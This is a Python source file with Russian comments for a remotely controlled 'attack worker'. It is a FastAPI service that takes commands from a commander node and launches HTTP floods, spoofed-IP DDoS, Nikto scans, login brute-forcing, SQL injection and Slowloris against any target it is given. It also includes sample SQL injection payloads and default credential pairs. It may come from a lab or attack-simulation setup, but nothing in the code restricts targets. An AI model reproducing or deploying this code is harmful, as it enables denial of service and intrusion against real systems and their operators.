"""
WORKER AGENT — пассивный агент на atk-2…atk-7.
Просто запускается — никакого COMMANDER_IP не нужно.
Командер сам добавляет этот узел через веб-интерфейс и толкает команды.

API:
  GET  /status   — текущий статус воркера
  POST /run      — запустить атаку  {"attack_type": "flood", "target": "1.2.3.4"}
  POST /stop     — остановить атаку
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
from fastapi import FastAPI
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s [worker] %(message)s")
logger = logging.getLogger("worker")

PORT     = int(os.getenv("WORKER_PORT", 5001))

_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)
app      = FastAPI(title="Attack Worker")

current_proc   = None
current_attack = None
current_target = None
lock           = threading.Lock()
started_at     = time.time()

# Статистика текущей атаки
_atk_started: float | None = None

# Ожидаемый RPS для каждого типа атаки (для оценки requests_sent)
EXPECTED_RPS = {
    "flood":     300,
    "ddos":      80,
    "scan":      5,
    "brute":     20,
    "sqli":      10,
    "slowloris": 2,
    "slow":      40,
}

# Шаблоны реальных HTTP-запросов для отображения в UI
def attack_sample(attack_type: str, target: str) -> list[str]:
    """Пример HTTP-запросов, генерируемых данным типом атаки."""
    import random
    t = target or "TARGET"
    samples = {
        "flood": [
            f"GET / HTTP/1.1",
            f"Host: {t}",
            f"User-Agent: ApacheBench/2.3",
            f"Accept: */*",
            f"Connection: Keep-Alive",
            f"",
            f"← 300 параллельных соединений, 500 000 запросов",
        ],
        "ddos": [
            f"GET / HTTP/1.1",
            f"Host: {t}",
            f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            f"",
            f"← IP меняется каждый запрос (500+ уникальных адресов)",
        ],
        "scan": [
            f"GET /wp-admin HTTP/1.1",
            f"GET /.env HTTP/1.1",
            f"GET /phpmyadmin HTTP/1.1",
            f"GET /actuator/env HTTP/1.1",
            f"GET /.git/HEAD HTTP/1.1",
            f"GET /admin/config.php HTTP/1.1",
            f"",
            f"← Nikto: ~6700 потенциально опасных URI",
        ],
        "brute": [
            f"POST /login HTTP/1.1",
            f"Host: {t}",
            f"Content-Type: application/x-www-form-urlencoded",
            f"",
            f"username=admin&password=qwerty123",
            f"username=root&password=password",
            f"username=user&password=123456",
            f"",
            f"← ~20 POST-запросов в секунду, случайные пары",
        ],
        "sqli": [
            f"GET /search?q=%27+OR+1%3D1-- HTTP/1.1",
            f"GET /api/data?id=1+UNION+SELECT+null%2Cnull-- HTTP/1.1",
            f"POST /login HTTP/1.1",
            f"  username=admin%27--&password=x",
            f"GET /user?name=%27+DROP+TABLE+users-- HTTP/1.1",
            f"",
            f"← 15 пейлоадов × 4 эндпоинта, ~10 req/s",
        ],
        "slowloris": [
            f"GET / HTTP/1.1\\r\\n",
            f"Host: {t}\\r\\n",
            f"User-Agent: Mozilla/5.0\\r\\n",
            f"X-a: b\\r\\n",
            f"[пауза 10с]",
            f"X-b: c\\r\\n",
            f"[пауза 10с — заголовок не завершён]",
            f"",
            f"← 200 незавершённых TCP-соединений",
        ],
        "slow": [
            f"GET /search HTTP/1.1",
            f"Host: {t}",
            f"User-Agent: wrk/4.2.0",
            f"Connection: keep-alive",
            f"",
            f"← wrk: 2 потока, 15 соединений, 60 сек",
        ],
    }
    return samples.get(attack_type, [f"Тип атаки: {attack_type}"])


ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "200", "-q", f"http://{t}/"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "90s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "slow":      lambda t: ["wrk", "-t2", "-c15", "-d60s", f"http://{t}/search"],
}


def _run(attack_type: str, target: str):
    global current_proc, current_attack, current_target, _atk_started
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
        cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
        logger.info(f"Запускаю {attack_type} → {target}")
        try:
            current_proc   = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            current_attack = attack_type
            current_target = target
            _atk_started   = time.time()
        except FileNotFoundError as e:
            logger.error(f"Инструмент не найден: {e}")
            current_proc = None


def _stop():
    global current_proc, current_attack, current_target, _atk_started
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
        current_proc   = None
        current_attack = None
        current_target = None
        _atk_started   = None


@app.get("/status")
def status():
    alive = current_proc is not None and current_proc.poll() is None
    return {
        "host":           socket.gethostname(),
        "ip":             socket.gethostbyname(socket.gethostname()),
        "status":         "attacking" if alive else "idle",
        "current_attack": current_attack if alive else None,
        "target":         current_target if alive else None,
        "uptime":         int(time.time() - started_at),
    }


@app.get("/stats")
def stats():
    """Расширенная статистика текущей атаки."""
    alive = current_proc is not None and current_proc.poll() is None
    elapsed = round(time.time() - _atk_started, 1) if _atk_started else 0
    exp_rps = EXPECTED_RPS.get(current_attack, 10) if alive else 0
    est_req = int(elapsed * exp_rps) if alive else 0
    return {
        "host":            socket.gethostname(),
        "ip":              socket.gethostbyname(socket.gethostname()),
        "status":          "attacking" if alive else "idle",
        "attack_type":     current_attack,
        "target":          current_target,
        "elapsed_sec":     elapsed,
        "estimated_rps":   exp_rps if alive else 0,
        "estimated_reqs":  est_req,
        "sample_requests": attack_sample(current_attack, current_target) if alive else [],
    }


@app.post("/run")
def run(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target", "")
    if not target:
        return {"error": "target required"}
    threading.Thread(target=_run, args=(attack_type, target), daemon=True).start()
    return {"status": "started", "attack": attack_type, "target": target}


@app.post("/stop")
def stop():
    _stop()
    return {"status": "stopped"}


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Worker ready — {my_ip}:{PORT}")
    logger.info(f"Добавь этот воркер в командер: POST /workers/add {{\"ip\": \"{my_ip}\"}}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
